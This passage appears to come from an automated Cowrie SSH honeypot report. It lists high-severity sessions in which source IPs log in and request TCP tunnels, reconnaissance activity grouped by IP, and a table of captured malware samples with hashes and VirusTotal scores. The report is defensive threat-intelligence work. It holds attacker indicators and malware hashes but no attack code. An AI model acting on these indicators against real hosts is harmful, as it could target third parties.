| `2026-07-19 18:28:55` | `cowrie.session.connect` |
| `2026-07-19 18:28:56` | `cowrie.client.version` |
| `2026-07-19 18:28:56` | `cowrie.client.kex` |
| `2026-07-19 18:28:58` | `cowrie.login.success` |
| `2026-07-19 18:28:58` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]46` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3860df09d568

| Field | Detail |
|---|---|
| **Source IP** | `45.118.49[.]18` |
| **First Seen** | 2026-07-19 18:29 |
| **Last Seen** | 2026-07-19 18:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:29:04` | `cowrie.session.connect` |
| `2026-07-19 18:29:04` | `cowrie.client.version` |
| `2026-07-19 18:29:04` | `cowrie.client.kex` |
| `2026-07-19 18:29:07` | `cowrie.login.success` |
| `2026-07-19 18:29:08` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.118.49[.]18` to AbuseIPDB if not already reported
- [ ] Block `45.118.49[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7bd8dfd952f

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]2` |
| **First Seen** | 2026-07-19 18:38 |
| **Last Seen** | 2026-07-19 18:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:38:46` | `cowrie.session.connect` |
| `2026-07-19 18:38:47` | `cowrie.client.version` |
| `2026-07-19 18:38:47` | `cowrie.client.kex` |
| `2026-07-19 18:38:49` | `cowrie.login.success` |
| `2026-07-19 18:38:49` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]2` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-750a8d3908fe

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-07-19 18:38 |
| **Last Seen** | 2026-07-19 18:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:38:56` | `cowrie.session.connect` |
| `2026-07-19 18:38:57` | `cowrie.client.version` |
| `2026-07-19 18:38:57` | `cowrie.client.kex` |
| `2026-07-19 18:38:59` | `cowrie.login.success` |
| `2026-07-19 18:39:00` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c45dece547

| Field | Detail |
|---|---|
| **Source IP** | `220.180.166[.]214` |
| **First Seen** | 2026-07-19 18:40 |
| **Last Seen** | 2026-07-19 18:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:40:17` | `cowrie.session.connect` |
| `2026-07-19 18:40:18` | `cowrie.client.version` |
| `2026-07-19 18:40:18` | `cowrie.client.kex` |
| `2026-07-19 18:40:19` | `cowrie.login.success` |
| `2026-07-19 18:40:20` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.166[.]214` to AbuseIPDB if not already reported
- [ ] Block `220.180.166[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-943683f2302a

| Field | Detail |
|---|---|
| **Source IP** | `23.30.11[.]253` |
| **First Seen** | 2026-07-19 18:40 |
| **Last Seen** | 2026-07-19 18:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:40:29` | `cowrie.session.connect` |
| `2026-07-19 18:40:30` | `cowrie.client.version` |
| `2026-07-19 18:40:30` | `cowrie.client.kex` |
| `2026-07-19 18:40:31` | `cowrie.login.success` |
| `2026-07-19 18:40:31` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.30.11[.]253` to AbuseIPDB if not already reported
- [ ] Block `23.30.11[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-126bbcddd6aa

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-07-19 18:42 |
| **Last Seen** | 2026-07-19 18:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:42:16` | `cowrie.session.connect` |
| `2026-07-19 18:42:18` | `cowrie.client.version` |
| `2026-07-19 18:42:18` | `cowrie.client.kex` |
| `2026-07-19 18:42:21` | `cowrie.login.success` |
| `2026-07-19 18:42:21` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ead26dd1c8

| Field | Detail |
|---|---|
| **Source IP** | `182.225.134[.]13` |
| **First Seen** | 2026-07-19 18:43 |
| **Last Seen** | 2026-07-19 18:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:43:49` | `cowrie.session.connect` |
| `2026-07-19 18:43:50` | `cowrie.client.version` |
| `2026-07-19 18:43:50` | `cowrie.client.kex` |
| `2026-07-19 18:43:51` | `cowrie.login.success` |
| `2026-07-19 18:43:52` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:43:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.225.134[.]13` to AbuseIPDB if not already reported
- [ ] Block `182.225.134[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00a902c64a26

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]30` |
| **First Seen** | 2026-07-19 18:43 |
| **Last Seen** | 2026-07-19 18:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:43:59` | `cowrie.session.connect` |
| `2026-07-19 18:43:59` | `cowrie.client.version` |
| `2026-07-19 18:43:59` | `cowrie.client.kex` |
| `2026-07-19 18:44:01` | `cowrie.login.success` |
| `2026-07-19 18:44:02` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]30` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de6dd18b80d4

| Field | Detail |
|---|---|
| **Source IP** | `119.92.76[.]210` |
| **First Seen** | 2026-07-19 18:46 |
| **Last Seen** | 2026-07-19 18:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:46:30` | `cowrie.session.connect` |
| `2026-07-19 18:46:31` | `cowrie.client.version` |
| `2026-07-19 18:46:31` | `cowrie.client.kex` |
| `2026-07-19 18:46:33` | `cowrie.login.success` |
| `2026-07-19 18:46:34` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.92.76[.]210` to AbuseIPDB if not already reported
- [ ] Block `119.92.76[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2439e26b1ab2

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-07-19 18:46 |
| **Last Seen** | 2026-07-19 18:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:46:44` | `cowrie.session.connect` |
| `2026-07-19 18:46:45` | `cowrie.client.version` |
| `2026-07-19 18:46:45` | `cowrie.client.kex` |
| `2026-07-19 18:46:47` | `cowrie.login.success` |
| `2026-07-19 18:46:47` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-630b749dfe15

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-07-19 18:48 |
| **Last Seen** | 2026-07-19 18:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:48:51` | `cowrie.session.connect` |
| `2026-07-19 18:48:52` | `cowrie.client.version` |
| `2026-07-19 18:48:52` | `cowrie.client.kex` |
| `2026-07-19 18:48:53` | `cowrie.login.success` |
| `2026-07-19 18:48:53` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6315e94b0668

| Field | Detail |
|---|---|
| **Source IP** | `203.129.217[.]70` |
| **First Seen** | 2026-07-19 18:49 |
| **Last Seen** | 2026-07-19 18:50 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:49:54` | `cowrie.session.connect` |
| `2026-07-19 18:49:56` | `cowrie.client.version` |
| `2026-07-19 18:49:56` | `cowrie.client.kex` |
| `2026-07-19 18:50:03` | `cowrie.login.success` |
| `2026-07-19 18:50:04` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.217[.]70` to AbuseIPDB if not already reported
- [ ] Block `203.129.217[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a726af1ad5c

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-07-19 18:50 |
| **Last Seen** | 2026-07-19 18:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:50:15` | `cowrie.session.connect` |
| `2026-07-19 18:50:15` | `cowrie.client.version` |
| `2026-07-19 18:50:15` | `cowrie.client.kex` |
| `2026-07-19 18:50:17` | `cowrie.login.success` |
| `2026-07-19 18:50:18` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a7b3f0b4d6

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-07-19 18:52 |
| **Last Seen** | 2026-07-19 18:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 18:52:25` | `cowrie.session.connect` |
| `2026-07-19 18:52:26` | `cowrie.client.version` |
| `2026-07-19 18:52:26` | `cowrie.client.kex` |
| `2026-07-19 18:52:28` | `cowrie.login.success` |
| `2026-07-19 18:52:29` | `cowrie.direct-tcpip.request` |
| `2026-07-19 18:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.76.137[.]24` | **23** | 2026-07-19 17:28 | 2026-07-19 18:25 | 27m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.195[.]63` | **4** | 2026-07-19 17:50 | 2026-07-19 17:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.61.192[.]156` | **3** | 2026-07-19 17:08 | 2026-07-19 18:53 | 2m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-07-19 17:21 | 2026-07-19 17:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]167` | **3** | 2026-07-19 18:54 | 2026-07-19 18:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]156` | **3** | 2026-07-19 18:18 | 2026-07-19 18:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]103` | **3** | 2026-07-19 17:51 | 2026-07-19 17:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]184` | **3** | 2026-07-19 17:51 | 2026-07-19 17:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]199` | **3** | 2026-07-19 17:51 | 2026-07-19 17:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]210` | **3** | 2026-07-19 17:51 | 2026-07-19 17:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-07-19 17:31 | 2026-07-19 17:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-07-19 18:05 | 2026-07-19 18:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.66.124[.]148` | 1 | 2026-07-19 17:53 | 2026-07-19 17:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-07-19 18:33 | 2026-07-19 18:33 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `148.227.90[.]248` | 1 | 2026-07-19 18:52 | 2026-07-19 18:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.218.116[.]96` | 1 | 2026-07-19 17:14 | 2026-07-19 17:14 | 30s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-07-19 17:02 | 2026-07-19 17:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-07-19 17:48 | 2026-07-19 17:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `8.134.239[.]76` | 1 | 2026-07-19 17:00 | 2026-07-19 17:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-07-19 17:05 | 2026-07-19 17:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 59/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
